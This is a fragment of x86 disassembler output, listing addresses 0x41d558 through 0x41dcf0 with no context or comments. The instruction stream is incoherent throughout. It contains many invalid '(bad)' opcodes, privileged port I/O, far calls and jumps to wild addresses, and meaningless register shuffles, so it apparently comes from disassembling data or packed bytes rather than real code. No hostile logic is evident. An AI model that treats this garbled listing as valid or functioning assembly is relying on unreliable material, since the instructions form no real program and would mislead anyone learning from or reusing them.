  41d558:	or     eax,0x194abfd6
  41d55d:	fwait
  41d55e:	imul   ebp,DWORD PTR [esi-0x54395700],0x92479403
  41d568:	leave  
  41d569:	daa    
  41d56a:	aad    0x62
  41d56c:	or     DWORD PTR [edx],ebp
  41d56e:	repnz sbb cl,BYTE PTR [esi+0x66]
  41d572:	int3   
  41d573:	mov    eax,0x3063448d
  41d578:	int    0xec
  41d57a:	test   dl,cl
  41d57c:	adc    al,0xf7
  41d57e:	mov    ebp,DWORD PTR [esi+0x5]
  41d581:	xor    BYTE PTR [ebx-0x69],0x9
  41d585:	leave  
  41d586:	xor    DWORD PTR [esi],ebp
  41d588:	cs std 
  41d58a:	push   eax
  41d58b:	dec    DWORD PTR [edx]
  41d58d:	push   edi
  41d58e:	and    BYTE PTR [edi+ebx*2],bh
  41d591:	and    DWORD PTR [ecx+0x40460faa],edi
  41d597:	push   ecx
  41d598:	adc    DWORD PTR [esi],edi
  41d59a:	add    ecx,ecx
  41d59c:	xor    BYTE PTR [edx+0x29],ah
  41d59f:	inc    ebp
  41d5a0:	stos   BYTE PTR es:[edi],al
  41d5a1:	cdq    
  41d5a2:	pop    ss
  41d5a3:	jp     0x41d5ff
  41d5a5:	dec    ecx
  41d5a6:	test   DWORD PTR [ebx-0x21],esi
  41d5a9:	mov    cl,0x10
  41d5ab:	sub    edi,ebx
  41d5ad:	std    
  41d5ae:	push   0x2c
  41d5b0:	sub    BYTE PTR [eax-0x28fd60d4],ch
  41d5b6:	outs   dx,BYTE PTR ds:[esi]
  41d5b7:	push   eax
  41d5b8:	int    0x32
  41d5ba:	clc    
  41d5bb:	push   esp
  41d5bc:	das    
  41d5bd:	jmp    DWORD PTR [ecx]
  41d5bf:	mov    ebp,DWORD PTR [ecx]
  41d5c1:	pop    esp
  41d5c2:	stos   DWORD PTR es:[edi],eax
  41d5c3:	out    0x3,eax
  41d5c5:	icebp  
  41d5c6:	add    ah,BYTE PTR [ebx-0x3aa35341]
  41d5cc:	mov    cl,0xac
  41d5ce:	xchg   DWORD PTR [ecx],edi
  41d5d0:	hlt    
  41d5d1:	scas   al,BYTE PTR es:[edi]
  41d5d2:	aam    0xed
  41d5d4:	lea    ebx,[eax+0x37a1d9e7]
  41d5da:	jne    0x41d5a4
  41d5dc:	inc    esp
  41d5dd:	int3   
  41d5de:	jmp    0x41d624
  41d5e0:	aas    
  41d5e1:	add    al,0x19
  41d5e3:	gs ret 
  41d5e5:	cwde   
  41d5e6:	test   BYTE PTR [edx+edi*1-0x70],bl
  41d5ea:	sbb    BYTE PTR [edx-0x163b14fd],bl
  41d5f0:	cmp    ax,0x3fa2
  41d5f4:	mov    al,0xbf
  41d5f6:	enter  0x91df,0x56
  41d5fa:	scas   eax,DWORD PTR es:[edi]
  41d5fb:	push   ds
  41d5fc:	xor    esi,DWORD PTR [eax-0x3af5c558]
  41d602:	pop    es
  41d603:	or     BYTE PTR [edi],dh
  41d605:	mov    ebp,0xf159983
  41d60a:	jnp    0x41d608
  41d60c:	adc    BYTE PTR [ebp+0x23f31c4],cl
  41d612:	sub    esi,DWORD PTR [ebp+0x3ca1532b]
  41d618:	movzx  eax,BYTE PTR [esp+eax*8+0x36]
  41d61d:	mov    WORD PTR [ebx+0x13],gs
  41d620:	xor    al,0x10
  41d622:	loop   0x41d60f
  41d624:	or     BYTE PTR [ebp+0x21],dl
  41d627:	test   BYTE PTR [eax-0x77],bl
  41d62a:	lock jne 0x41d61f
  41d62d:	outs   dx,BYTE PTR ds:[esi]
  41d62e:	out    dx,al
  41d62f:	call   0x415:0x4cf60fe
  41d636:	(bad)  
  41d637:	adc    al,bl
  41d639:	dec    eax
  41d63a:	addr16 push ss
  41d63c:	xchg   BYTE PTR [ebp*8-0x1275b3bc],cl
  41d643:	dec    eax
  41d644:	jmp    0x41d5dd
  41d646:	xor    eax,0xdded3a6a
  41d64b:	mov    ebx,esi
  41d64d:	stos   DWORD PTR es:[edi],eax
  41d64e:	xor    al,0x1c
  41d650:	or     eax,0x885ca7b1
  41d655:	aaa    
  41d656:	push   cs
  41d657:	lock pop ebx
  41d659:	sub    BYTE PTR [esi+0x4b00c1f0],ch
  41d65f:	push   ds
  41d660:	mov    ch,0xf1
  41d662:	shr    cl,1
  41d664:	pop    ecx
  41d665:	ins    BYTE PTR es:[edi],dx
  41d666:	cmp    eax,0x52ab47fd
  41d66b:	push   0x2c
  41d66d:	stos   DWORD PTR es:[edi],eax
  41d66e:	pop    ecx
  41d66f:	sbb    al,0x4a
  41d671:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d672:	mov    al,ds:0x1c782641
  41d677:	pop    ss
  41d678:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d679:	fdiv   QWORD PTR ds:0x2ac45f35
  41d67f:	sti    
  41d680:	jmp    0x1d9ea7ad
  41d685:	add    cl,cl
  41d687:	fld    DWORD PTR [ecx-0x10]
  41d68a:	std    
  41d68b:	sub    al,0x58
  41d68d:	pop    edi
  41d68e:	dec    esp
  41d68f:	fist   DWORD PTR [ecx]
  41d691:	ret    
  41d692:	out    0x2e,al
  41d694:	in     al,dx
  41d695:	popa   
  41d696:	cmp    edi,DWORD PTR [edx+0x3e]
  41d699:	fsubr  st,st(1)
  41d69b:	pop    edx
  41d69c:	jmp    0x974d371e
  41d6a1:	cmp    eax,0x73835d2e
  41d6a6:	dec    ebp
  41d6a7:	(bad)  
  41d6a8:	arpl   di,di
  41d6aa:	loopne 0x41d67a
  41d6ac:	push   esp
  41d6ad:	xor    cl,BYTE PTR [ebx+0x5a349661]
  41d6b3:	sub    al,0x99
  41d6b5:	mov    dl,0x60
  41d6b7:	dec    esi
  41d6b8:	cmp    dh,BYTE PTR [edi+ecx*4+0x66]
  41d6bc:	pop    ss
  41d6bd:	mov    ?,esp
  41d6bf:	jo     0x41d730
  41d6c1:	nop
  41d6c2:	cmovnp ebx,DWORD PTR [ebp+0x631a27ae]
  41d6c9:	push   ebx
  41d6ca:	push   ebx
  41d6cb:	fcomp  st(2)
  41d6cd:	dec    edx
  41d6ce:	mov    eax,ds:0xbbc2cad7
  41d6d3:	(bad)
  41d6d8:	push   ss
  41d6d9:	lds    esi,FWORD PTR [ebx-0x4f]
  41d6dc:	cmp    eax,0xda7b6f9a
  41d6e1:	cmp    eax,0x5616a194
  41d6e6:	fidiv  DWORD PTR [edi+esi*8]
  41d6e9:	add    bh,ch
  41d6eb:	sub    edi,DWORD PTR [edx+0x2b]
  41d6ee:	add    eax,0x3c5ca5ad
  41d6f3:	test   al,0x69
  41d6f5:	aam    0x92
  41d6f7:	pop    esp
  41d6f8:	idiv   edi
  41d6fa:	sbb    eax,0xd4009215
  41d6ff:	mov    eax,ds:0x11f24e8f
  41d704:	cmp    DWORD PTR [edx-0x80],ebp
  41d707:	mov    dl,0x6
  41d709:	popa   
  41d70a:	dec    ebx
  41d70b:	inc    ebx
  41d70c:	adc    ah,BYTE PTR [ecx+0x35e7ac6]
  41d712:	dec    ebx
  41d713:	pop    ebx
  41d714:	pop    es
  41d715:	adc    eax,0x3e65a707
  41d71a:	scas   al,BYTE PTR es:[edi]
  41d71b:	test   eax,0xbb90eb2b
  41d720:	cmp    eax,0x561c7ca9
  41d725:	mov    bl,0x2d
  41d727:	inc    edi
  41d728:	pop    edi
  41d729:	addr16 in eax,0xb0
  41d72c:	shl    dl,0xc4
  41d72f:	xchg   edx,eax
  41d730:	xor    eax,0x2b111618
  41d735:	fs dec edi
  41d737:	aam    0x80
  41d739:	out    0x6f,eax
  41d73b:	neg    ah
  41d73d:	xor    bh,al
  41d73f:	or     BYTE PTR [eax+0xd],0x61
  41d743:	in     eax,0xd1
  41d745:	cmc    
  41d746:	cmp    al,0x6a
  41d748:	outs   dx,BYTE PTR ds:[esi]
  41d749:	or     DWORD PTR [edi-0x8286193],ebp
  41d74f:	mov    eax,0x6d856114
  41d754:	or     cl,BYTE PTR [edi-0x50]
  41d757:	outs   dx,DWORD PTR ds:[esi]
  41d758:	inc    ebx
  41d759:	nop
  41d75a:	cdq    
  41d75b:	inc    edx
  41d75c:	stc    
  41d75d:	leave  
  41d75e:	arpl   WORD PTR [esp+ecx*2],ax
  41d761:	loopne 0x41d704
  41d763:	and    eax,0xa46e2eed
  41d768:	sbb    eax,0x1ea29b69
  41d76d:	popa   
  41d76e:	outs   dx,DWORD PTR ds:[esi]
  41d76f:	(bad)  
  41d770:	jecxz  0x41d73f
  41d772:	test   DWORD PTR [ecx-0x379713c5],0x8b88fd44
  41d77c:	mov    ebp,0x9613ae41
  41d781:	xchg   ecx,eax
  41d782:	add    ah,BYTE PTR ds:0x501a8669
  41d788:	pop    esi
  41d789:	mov    dh,0xe4
  41d78b:	bound  esi,QWORD PTR [edi]
  41d78d:	loope  0x41d7d2
  41d78f:	pop    edi
  41d790:	int3   
  41d791:	mov    ebp,0xc859e990
  41d796:	adc    ebp,DWORD PTR [eax+eax*8-0x2c]
  41d79a:	(bad)  
  41d79b:	cmp    al,0x19
  41d79d:	add    DWORD PTR [eax+0x1f],0xdd3eab5e
  41d7a4:	inc    ebp
  41d7a5:	jno    0x41d7c8
  41d7a7:	adc    ah,BYTE PTR [esi+0xc]
  41d7aa:	out    0xe3,eax
  41d7ac:	cmp    BYTE PTR [eax+0x1ed3d0a3],bh
  41d7b2:	test   DWORD PTR [ebx+ecx*8-0x1e8136b0],0x886f9d3e
  41d7bd:	test   DWORD PTR [ebp-0x37],edi
  41d7c0:	jle    0x41d82c
  41d7c2:	inc    ebx
  41d7c3:	pminsw mm5,QWORD PTR [eax+0x4a]
  41d7c7:	hlt    
  41d7c8:	aad    0xf
  41d7ca:	mov    edx,DWORD PTR [eax]
  41d7cc:	cwde   
  41d7cd:	outs   dx,DWORD PTR ds:[esi]
  41d7ce:	cmc    
  41d7cf:	cmp    BYTE PTR [ecx+edi*8+0x2b159cc2],cl
  41d7d6:	sbb    ah,BYTE PTR [ebx]
  41d7d8:	sub    bl,0x5e
  41d7db:	sub    eax,0x3165d968
  41d7e0:	leave  
  41d7e1:	loope  0x41d803
  41d7e3:	and    al,0x20
  41d7e5:	cmp    dh,BYTE PTR [ebx-0x2c]
  41d7e8:	sbb    al,0xf6
  41d7ea:	adc    BYTE PTR ds:[esi],al
  41d7ed:	int3   
  41d7ee:	outs   dx,BYTE PTR ds:[esi]
  41d7ef:	inc    esi
  41d7f0:	xor    ch,dh
  41d7f2:	inc    esp
  41d7f3:	xlat   BYTE PTR ds:[ebx]
  41d7f4:	mov    eax,0xeddb47d3
  41d7f9:	push   eax
  41d7fa:	cmp    ch,0xcd
  41d7fd:	pop    edi
  41d7fe:	pop    ecx
  41d7ff:	repz add BYTE PTR [eax],al
  41d802:	pop    esp
  41d803:	mov    dh,BYTE PTR [edi-0x23800895]
  41d809:	mov    edi,0xd9de0759
  41d80e:	xchg   esp,eax
  41d80f:	ja     0x41d7ce
  41d811:	aad    0xfc
  41d813:	dec    esi
  41d814:	add    DWORD PTR [eax],eax
  41d816:	add    eax,DWORD PTR es:[eax]
  41d819:	add    BYTE PTR [esi+0x2393e3c7],al
  41d81f:	enter  0x436b,0x25
  41d823:	pop    eax
  41d824:	fwait
  41d825:	call   0x4843e7db
  41d82a:	mov    ecx,0x497fb2ba
  41d82f:	lods   al,BYTE PTR ds:[esi]
  41d830:	in     al,dx
  41d831:	jl     0x41d86f
  41d833:	cmp    BYTE PTR [edx+ebp*2-0x21],0x21
  41d838:	or     bl,BYTE PTR ds:[edx]
  41d83b:	aad    0xee
  41d83d:	mov    edi,0xc6bbe408
  41d842:	dec    esp
  41d843:	pushf  
  41d844:	shr    BYTE PTR [eax],cl
  41d846:	push   0xd7b97bf7
  41d84b:	mov    cl,0xd1
  41d84d:	out    0x2a,eax
  41d84f:	pop    ss
  41d850:	cwde   
  41d851:	jbe    0x41d860
  41d853:	pop    edi
  41d854:	adc    BYTE PTR [eax-0x25c85269],dl
  41d85a:	in     al,0x20
  41d85c:	dec    ebx
  41d85d:	mov    eax,eax
  41d85f:	lds    esi,FWORD PTR [esi]
  41d861:	repz or edx,0xcf8eb437
  41d868:	daa    
  41d869:	pop    eax
  41d86a:	xchg   esp,eax
  41d86b:	mov    bh,0x41
  41d86d:	xor    DWORD PTR [ebx+0x2e],0xdd18cd35
  41d874:	pop    ecx
  41d875:	data16 cmc 
  41d877:	mov    ch,0x4e
  41d879:	xchg   esi,eax
  41d87a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d87b:	and    eax,0x250bd749
  41d880:	xchg   esi,eax
  41d881:	sbb    eax,0x39d17fc7
  41d886:	rol    DWORD PTR [esi-0x6766e327],cl
  41d88c:	add    al,0x4e
  41d88e:	mov    al,ds:0x2ada103c
  41d893:	(bad)  
  41d894:	vunpcklps ymm2,ymm4,YMMWORD PTR [ecx+ebp*2+0x53]
  41d89a:	imul   ebp,DWORD PTR [esi],0xffffffc1
  41d89d:	inc    esi
  41d89e:	push   ss
  41d89f:	lahf   
  41d8a0:	mov    eax,ds:0xe55e87e7
  41d8a5:	out    dx,al
  41d8a6:	inc    ecx
  41d8a7:	push   ecx
  41d8a8:	adc    BYTE PTR [eax+0x52439c49],dl
  41d8ae:	fcmovu st,st(7)
  41d8b0:	mov    ecx,0xdecb24e7
  41d8b5:	adc    al,0xfd
  41d8b7:	fwait
  41d8b8:	mov    esp,0xb0cd8826
  41d8bd:	push   ebx
  41d8be:	frstor [ebp-0x75]
  41d8c1:	sahf   
  41d8c2:	out    0xbe,eax
  41d8c4:	clc    
  41d8c5:	or     DWORD PTR [ecx],0x6ea53cc0
  41d8cb:	fcmovnb st,st(7)
  41d8cd:	(bad)  
  41d8ce:	xchg   edx,eax
  41d8cf:	(bad)  
  41d8d0:	je     0x41d91a
  41d8d2:	retf   0x314e
  41d8d5:	xchg   BYTE PTR [ebx+edx*2+0x7c537a07],dh
  41d8dc:	sbb    DWORD PTR [ebp+0x74],esi
  41d8df:	or     eax,0x5018410c
  41d8e4:	inc    ebx
  41d8e5:	push   ecx
  41d8e6:	mov    ecx,0x8c5bed2e
  41d8eb:	fs push esp
  41d8ed:	mov    eax,0xed159281
  41d8f2:	mov    bh,0x11
  41d8f4:	repnz sbb DWORD PTR [ebx-0xd37ec5d],esp
  41d8fb:	cli    
  41d8fc:	xchg   edi,eax
  41d8fd:	push   es
  41d8fe:	(bad)  
  41d900:	(bad)  
  41d901:	loop   0x41d981
  41d903:	sar    DWORD PTR [ebx-0x783b8bb6],0xca
  41d90a:	(bad)  
  41d90b:	and    bl,dh
  41d90d:	test   edi,0x7e2d2a74
  41d913:	xor    al,0x6d
  41d915:	lock fwait
  41d917:	mov    ch,0x5d
  41d919:	dec    esi
  41d91a:	mov    dh,0xf6
  41d91c:	add    dl,0x74
  41d91f:	cmc    
  41d920:	mov    fs,WORD PTR [edx+edi*8-0x5574f562]
  41d927:	cmp    eax,0x4db747c6
  41d92c:	les    esp,FWORD PTR [edi+0x3e]
  41d92f:	sbb    eax,0xb418a153
  41d934:	mov    al,BYTE PTR [ecx-0x3073a85]
  41d93a:	xchg   esp,eax
  41d93b:	call   0x27c2711
  41d940:	mov    DWORD PTR [edi-0x4fa7a274],ebp
  41d946:	add    BYTE PTR [edx+edx*4],0x12
  41d94a:	std    
  41d94b:	add    bl,cl
  41d94d:	fist   WORD PTR [edx]
  41d94f:	mov    WORD PTR [eax-0x1f0b10ee],ss
  41d955:	sbb    al,0x62
  41d957:	iret   
  41d958:	xchg   esi,eax
  41d959:	(bad)  
  41d95a:	xchg   edi,eax
  41d95b:	ss jecxz 0x41d8f4
  41d95e:	pop    es
  41d95f:	inc    edx
  41d960:	mov    edx,0x82666fd2
  41d965:	rcr    DWORD PTR [ebx+0x63],1
  41d968:	cld    
  41d969:	jnp    0x41d944
  41d96b:	mov    ebx,0x56889078
  41d970:	rcr    DWORD PTR [edx+0x63],0x79
  41d974:	dec    ebx
  41d975:	add    al,0xa6
  41d977:	mov    esi,esi
  41d979:	cmp    BYTE PTR [ebp+0x7db3bc73],al
  41d97f:	std    
  41d980:	jbe    0x41d9eb
  41d982:	and    edx,DWORD PTR [ebp-0x45]
  41d985:	lds    ecx,FWORD PTR [edx-0x80]
  41d988:	mov    dl,BYTE PTR [ebp+0x181acacc]
  41d98e:	popa   
  41d98f:	mov    WORD PTR [ebx+0x4b],cs
  41d992:	add    DWORD PTR [ebx+ecx*8+0x33],ebx
  41d996:	repz xor eax,0x8f03e1b6
  41d99c:	fcom   DWORD PTR es:[edx+eiz*2]
  41d9a0:	jp     0x41d987
  41d9a2:	cmp    esi,DWORD PTR [bp+di]
  41d9a5:	mov    ebx,0x1a17efc1
  41d9aa:	pop    ebx
  41d9ab:	sbb    DWORD PTR [ebp+0x1b],ebp
  41d9ae:	xor    ch,BYTE PTR [ecx+0x2b25fd00]
  41d9b4:	fcmovnb st,st(0)
  41d9b6:	in     al,dx
  41d9b7:	sub    eax,0x7a2c576e
  41d9bc:	iret   
  41d9bd:	icebp  
  41d9be:	mov    ds:0x27294987,eax
  41d9c3:	push   ds
  41d9c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d9c5:	stos   DWORD PTR es:[edi],eax
  41d9c6:	(bad)  
  41d9c7:	out    0x20,al
  41d9c9:	outs   dx,BYTE PTR ds:[esi]
  41d9ca:	adc    al,BYTE PTR [ebp+0xcd7a700]
  41d9d0:	adc    bh,BYTE PTR [eax+0x7c]
  41d9d3:	cld    
  41d9d4:	adc    DWORD PTR [ecx-0x52],ebp
  41d9d7:	xor    al,0x43
  41d9d9:	pop    ebp
  41d9da:	mov    ecx,0x2b8f89fe
  41d9df:	xchg   esp,eax
  41d9e0:	int3   
  41d9e1:	sub    BYTE PTR [esi-0x1c027c6c],bh
  41d9e7:	stc    
  41d9e8:	sbb    DWORD PTR [edi-0x2a8b6618],edi
  41d9ee:	data16 ins BYTE PTR es:[edi],dx
  41d9f0:	out    0x49,eax
  41d9f2:	and    DWORD PTR [ebx],esi
  41d9f4:	stc    
  41d9f5:	or     bh,ah
  41d9f7:	dec    edi
  41d9f8:	ror    DWORD PTR [eax+ebx*2-0x5e],0x71
  41d9fd:	xor    al,ch
  41d9ff:	(bad)  
  41da00:	jno    0x41da1f
  41da02:	mov    edx,0x5c498bcd
  41da07:	jmp    0x41da58
  41da09:	inc    edi
  41da0a:	mov    BYTE PTR [ebx-0x59],bh
  41da0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da0e:	mov    cl,0xbd
  41da10:	sbb    bh,bh
  41da12:	pop    eax
  41da13:	adc    bl,bl
  41da15:	adc    cl,BYTE PTR [edi]
  41da17:	(bad)  
  41da18:	fstp   DWORD PTR [edi]
  41da1a:	xchg   edx,eax
  41da1b:	test   al,0x43
  41da1d:	xlat   BYTE PTR ds:[ebx]
  41da1e:	enter  0xfeaa,0xe6
  41da22:	dec    esp
  41da23:	mov    ecx,0xad4e29e7
  41da28:	push   ebx
  41da29:	pop    ecx
  41da2a:	and    al,0x77
  41da2c:	push   ds
  41da2d:	and    al,0x4c
  41da2f:	test   DWORD PTR [ebx+eiz*8+0x6fffee7f],eax
  41da36:	add    cl,cl
  41da38:	push   ds
  41da39:	pop    es
  41da3a:	sti    
  41da3b:	mov    ah,0xe2
  41da3d:	or     cl,BYTE PTR [edi+0x3340d103]
  41da43:	loop   0x41da93
  41da45:	push   ss
  41da46:	dec    eax
  41da47:	xlat   BYTE PTR ds:[ebx]
  41da48:	push   ss
  41da49:	les    ebx,FWORD PTR [esi*2+0x11d77f39]
  41da50:	ffreep st(0)
  41da52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41da53:	pop    DWORD PTR [ebx+edx*8]
  41da56:	sbb    DWORD PTR [edi],edi
  41da58:	jne    0x41da88
  41da5a:	bound  edi,QWORD PTR [edi+eax*8-0x339e817e]
  41da61:	ret    0x99bf
  41da64:	or     eax,0xb3482766
  41da69:	lods   al,BYTE PTR ds:[esi]
  41da6a:	es jmp 0x41da3a
  41da6d:	jbe    0x41da26
  41da6f:	xchg   ebp,esi
  41da71:	mov    ds:0xffb78cc8,al
  41da76:	pop    ds
  41da77:	xor    ch,0x73
  41da7a:	inc    esi
  41da7b:	(bad)  [esi-0x368db402]
  41da81:	adc    eax,0x4dc3a252
  41da86:	dec    eax
  41da87:	push   esi
  41da88:	out    dx,al
  41da89:	dec    ebp
  41da8a:	imul   edi,DWORD PTR [eax-0x3b],0x6d
  41da8e:	pop    esi
  41da8f:	aam    0x2c
  41da91:	inc    eax
  41da92:	xlat   BYTE PTR ds:[ebx]
  41da93:	pop    ebp
  41da94:	ror    BYTE PTR [edi],cl
  41da96:	call   0x79b36f67
  41da9b:	ror    BYTE PTR [edi],0x55
  41da9e:	cdq    
  41da9f:	sub    DWORD PTR [edi],esi
  41daa1:	add    esp,DWORD PTR [esi-0xe]
  41daa4:	xchg   ebx,eax
  41daa5:	add    al,dh
  41daa7:	mov    esi,0x16ec40a9
  41daac:	mov    ebp,0xb358be76
  41dab1:	mov    ?,esp
  41dab3:	lea    esi,[ebp+0x326fb678]
  41dab9:	xchg   edi,eax
  41daba:	jmp    0x41dac3
  41dabc:	sub    BYTE PTR [edi+eax*2-0x4c],ch
  41dac0:	dec    edx
  41dac1:	pushf  
  41dac2:	or     edi,DWORD PTR ds:0xd7f2be25
  41dac8:	pop    ecx
  41dac9:	push   ds
  41daca:	dec    esp
  41dacb:	repz shr DWORD PTR ds:[ecx+0x34ac7573],cl
  41dad3:	and    ecx,edx
  41dad5:	test   BYTE PTR [edi+edi*8+0x55],dh
  41dad9:	in     eax,dx
  41dada:	test   BYTE PTR [edx],ch
  41dadc:	adc    bl,al
  41dade:	ds div edi
  41dae1:	mov    dl,0x5c
  41dae3:	adc    ch,dh
  41dae5:	jge    0x41dad0
  41dae7:	(bad)  [eax-0x3724b657]
  41daed:	xor    BYTE PTR [eax+0x33],ah
  41daf0:	or     eax,ecx
  41daf2:	mov    ch,0x82
  41daf4:	js     0x41db32
  41daf6:	mov    esi,0xee6bbd0
  41dafb:	loopne 0x41dae9
  41dafd:	cwde   
  41dafe:	and    al,0x3e
  41db00:	into   
  41db01:	xchg   esp,eax
  41db02:	daa    
  41db03:	adc    al,BYTE PTR [edi]
  41db05:	inc    esp
  41db06:	inc    eax
  41db07:	inc    eax
  41db08:	cmp    al,0xfd
  41db0a:	push   ds
  41db0b:	xchg   BYTE PTR [eax],cl
  41db0d:	cld    
  41db0e:	mov    edi,0x87f43142
  41db13:	std    
  41db14:	mov    esp,0x325d3353
  41db19:	(bad)  
  41db1a:	in     al,dx
  41db1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db1c:	sub    BYTE PTR [esi-0x5a506006],bh
  41db22:	push   ds
  41db23:	pop    eax
  41db24:	add    ch,0x91
  41db27:	dec    edi
  41db28:	(bad)  
  41db29:	mov    bl,0x8b
  41db2b:	clc    
  41db2c:	and    dh,BYTE PTR [ebx]
  41db2e:	nop
  41db2f:	neg    ecx
  41db31:	add    esp,DWORD PTR [esi+0x1b]
  41db34:	les    edi,FWORD PTR ds:0x22368338
  41db3a:	jmp    0x8f529dcb
  41db3f:	mov    al,ds:0x1aa70000
  41db44:	xchg   edx,ebx
  41db46:	mov    edi,0xac7fffdf
  41db4b:	pop    ss
  41db4c:	aad    0x14
  41db4e:	add    ebp,DWORD PTR [ebx+0x5222a357]
  41db54:	add    DWORD PTR [eax],eax
  41db56:	add    eax,DWORD PTR es:[eax]
  41db59:	add    BYTE PTR [eax+edx*2+0x3d],ah
  41db5d:	fstp   DWORD PTR ds:0xa59719df
  41db63:	jmp    0xb910b9a8
  41db68:	fisubr WORD PTR [edx+0x71]
  41db6b:	(bad)  
  41db6c:	outs   dx,BYTE PTR ds:[esi]
  41db6d:	or     al,0xc
  41db6f:	push   edx
  41db70:	sar    DWORD PTR ds:0x88807036,1
  41db76:	leave  
  41db77:	pop    esp
  41db78:	push   ds
  41db79:	aaa    
  41db7a:	aaa    
  41db7b:	call   0x61bf3d03
  41db80:	aas    
  41db81:	pushf  
  41db82:	sub    DWORD PTR [eax],esp
  41db84:	scas   eax,DWORD PTR es:[edi]
  41db85:	push   ebp
  41db86:	mov    dh,0xce
  41db88:	inc    ebp
  41db89:	xor    esp,edx
  41db8b:	ins    DWORD PTR es:[edi],dx
  41db8c:	nop
  41db8d:	xchg   ebp,eax
  41db8e:	cmp    DWORD PTR [ebx],edx
  41db90:	mov    ebx,0x3009baca
  41db95:	inc    esp
  41db96:	sar    BYTE PTR [esi-0x71dd1202],1
  41db9c:	nop
  41db9d:	lock pop edi
  41db9f:	sbb    eax,0xf6fd45c4
  41dba4:	mov    bh,ah
  41dba6:	imul   esp,DWORD PTR [ecx+edx*1],0xea93fd8a
  41dbad:	cmp    dh,al
  41dbaf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dbb0:	and    bl,bl
  41dbb2:	xlat   BYTE PTR ds:[ebx]
  41dbb3:	mov    ds:0xad363cc1,eax
  41dbb8:	sar    BYTE PTR ds:0x36a1275a,0x2a
  41dbbf:	outs   dx,DWORD PTR ds:[esi]
  41dbc0:	adc    esi,DWORD PTR [edi+0x73]
  41dbc3:	mov    edi,0xfa4a851f
  41dbc8:	push   ebp
  41dbc9:	adc    dl,BYTE PTR [esi+esi*4+0x1c40d809]
  41dbd0:	bound  edx,QWORD PTR [ebx+ebx*8-0x77]
  41dbd4:	or     al,0x54
  41dbd6:	cwde   
  41dbd7:	xor    al,0x2
  41dbd9:	nop
  41dbda:	(bad)  
  41dbdb:	jno    0x41dbff
  41dbdd:	sub    edx,ebp
  41dbdf:	in     al,0x37
  41dbe1:	adc    BYTE PTR gs:[eax+0x33],dl
  41dbe5:	sahf   
  41dbe6:	adc    ch,dl
  41dbe8:	mov    eax,ds
  41dbea:	(bad)  
  41dbeb:	xchg   esi,eax
  41dbec:	inc    esp
  41dbed:	(bad)  [edx-0x2de48c63]
  41dbf3:	mov    bl,0xe1
  41dbf5:	gs mov ecx,0xe064bb4e
  41dbfb:	aaa    
  41dbfc:	fdivr  QWORD PTR ds:0x5f8237c7
  41dc02:	mov    bl,0xdb
  41dc04:	push   ebp
  41dc05:	ret    
  41dc06:	dec    edi
  41dc07:	pop    esp
  41dc08:	and    ah,BYTE PTR [edx+0xa424a59]
  41dc0e:	lods   eax,DWORD PTR ds:[esi]
  41dc0f:	aam    0x6d
  41dc11:	adc    eax,0x3325396e
  41dc16:	and    eax,0xb8b4a96f
  41dc1b:	inc    ecx
  41dc1c:	adc    BYTE PTR [ebp-0x324fab7],0xea
  41dc23:	test   eax,0xc32c4071
  41dc28:	ss ds ja 0x41dc51
  41dc2c:	retf   
  41dc2d:	sar    ah,cl
  41dc2f:	mov    edi,DWORD PTR ds:0xd56acf44
  41dc35:	scas   al,BYTE PTR es:[edi]
  41dc36:	loope  0x41dcb0
  41dc38:	sub    dl,BYTE PTR [eax]
  41dc3a:	or     dh,bh
  41dc3c:	outs   dx,DWORD PTR ds:[esi]
  41dc3d:	pop    ebx
  41dc3e:	call   0xdacdc919
  41dc43:	mov    al,ds:0x9ce988a7
  41dc48:	repz sbb DWORD PTR [ebp-0x1614691d],0x61
  41dc50:	int3   
  41dc51:	add    ah,BYTE PTR [ebx+esi*2+0x14]
  41dc55:	sub    DWORD PTR [ebx+0x1509850f],ebx
  41dc5b:	test   al,0x90
  41dc5d:	test   DWORD PTR [ebx+0x38800c97],ebp
  41dc63:	add    edx,edx
  41dc65:	mov    al,0x2c
  41dc67:	jae    0x41dc4b
  41dc69:	lods   eax,DWORD PTR ds:[esi]
  41dc6a:	and    al,0xab
  41dc6c:	jle    0x41dcdc
  41dc6e:	jge    0x41dc22
  41dc70:	in     eax,dx
  41dc71:	stos   DWORD PTR es:[edi],eax
  41dc72:	fst    QWORD PTR [eax+0x4f]
  41dc75:	pusha  
  41dc76:	mov    eax,0xc0fc526d
  41dc7b:	fld    QWORD PTR [eax+0x1d4e0318]
  41dc81:	xchg   edi,eax
  41dc82:	nop
  41dc83:	das    
  41dc84:	lea    edx,[edx+0x46]
  41dc87:	pop    ss
  41dc88:	loope  0x41dc1b
  41dc8a:	push   eax
  41dc8b:	pop    ebp
  41dc8c:	add    eax,0x40d751cf
  41dc91:	data16 ins BYTE PTR es:[edi],dx
  41dc93:	dec    ecx
  41dc94:	mov    bh,0xb
  41dc96:	into   
  41dc97:	pop    edi
  41dc98:	pop    esi
  41dc99:	xchg   BYTE PTR [ecx],ch
  41dc9b:	mov    dl,0xb7
  41dc9d:	stos   BYTE PTR es:[edi],al
  41dc9e:	jno    0x41dca3
  41dca0:	mov    es,WORD PTR [ebx-0xc8c3586]
  41dca6:	xor    eax,0x1b44d50f
  41dcab:	pop    ecx
  41dcac:	mov    esi,0x20838f4e
  41dcb1:	adc    eax,0x7b7fc12b
  41dcb6:	push   edx
  41dcb7:	mov    ebx,0x86ed34f2
  41dcbc:	outs   dx,BYTE PTR ds:[esi]
  41dcbd:	mov    ds:0xe0f80be9,al
  41dcc2:	out    dx,eax
  41dcc3:	popa   
  41dcc4:	pop    edi
  41dcc5:	mov    ebx,0x47bfc68
  41dcca:	cmp    eax,0x219e3901
  41dccf:	call   0xef38:0x852ba9b3
  41dcd6:	pop    ebx
  41dcd7:	aam    0x1d
  41dcd9:	dec    ebx
  41dcda:	cwde   
  41dcdb:	jge    0x41dd2e
  41dcdd:	call   0x765f225
  41dce2:	gs jmp 0x8698049d
  41dce8:	outs   dx,DWORD PTR ds:[esi]
  41dce9:	sbb    al,0xe0
  41dceb:	and    al,0x55
  41dced:	stc    
  41dcee:	push   ds
  41dcef:	retf   
  41dcf0:	pop    eax
